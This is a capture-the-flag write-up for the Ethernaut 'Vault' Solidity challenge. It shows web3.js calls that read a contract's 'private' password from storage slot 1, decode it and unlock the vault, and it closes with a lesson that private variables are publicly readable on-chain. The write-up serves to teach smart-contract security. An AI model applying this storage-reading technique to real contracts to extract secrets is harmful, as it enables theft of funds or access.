# 08. Vault
<sup>Difficulty 3/10</sup>

Unlock the vault to pass the level!

## Solution

To unlock the vault we need to exploit the function `unlock`:

```solidity
function unlock(bytes32 _password) public {
    if (password == _password) {
        locked = false;
    }
}
```

But we need to know the password, which, luckily is an internal variable:

```solidity
bytes32 private password;

constructor(bytes32 _password) public {
    locked = true;
    password = _password;
}
```

Everything on the blockchain (including private state variables) is public!

We need to extrapolate and read the password value.

Via `web3.eth.getStorageAt(address, position [, defaultBlock] [, callback])` function (see [web3 docs](https://web3js.readthedocs.io/en/v1.2.11/web3-eth.html#getstorageat)) we can get a variable off the `address` at given `position`. 
In solidity the variable are indexed in position order, so, according to the declaration order, we have the following indexes:

| Index | Variable |
|:------|:---------|
| 0     | locked   |
| 1     | password |

Hence, first we get the password value:

```javascript
await web3.eth.getStorageAt(contract.address, 1)
// -> '0x412076657279207374726f6e67207365637265742070617373776f7264203a29'
// For reference sake only:
await web3.eth.getStorageAt(contract.address, 0)
// -> '0x0000000000000000000000000000000000000000000000000000000000000001' == true
```

Now we got the password byte-encoded we could already complete the challenge, but first let's decode it and then unlock the vault:

```javascript
const decodedPass = web3.utils.hexToAscii(encodedPass)
console.log(decodedPass)
// -> 'A very strong secret password :)'
await contract.locked()
// -> true
await contract.unlock(encodedPass)
await contract.locked()
// -> false
```

Note that we don't need decoded password as the `unlock` function requires a `bytes32` and not a `string`

## OZ Corner

It's important to remember that marking a variable as private only prevents other contracts from accessing it. State variables marked as private and local variables are still publicly accessible.

To ensure that data is private, it needs to be encrypted before being put onto the blockchain. In this scenario, the decryption key should never be sent on-chain, as it will then be visible to anyone who looks for it. [zk-SNARKs](https://blog.ethereum.org/2016/12/05/zksnarks-in-a-nutshell/) provide a way to determine whether someone possesses a secret parameter, without ever having to reveal the parameter.

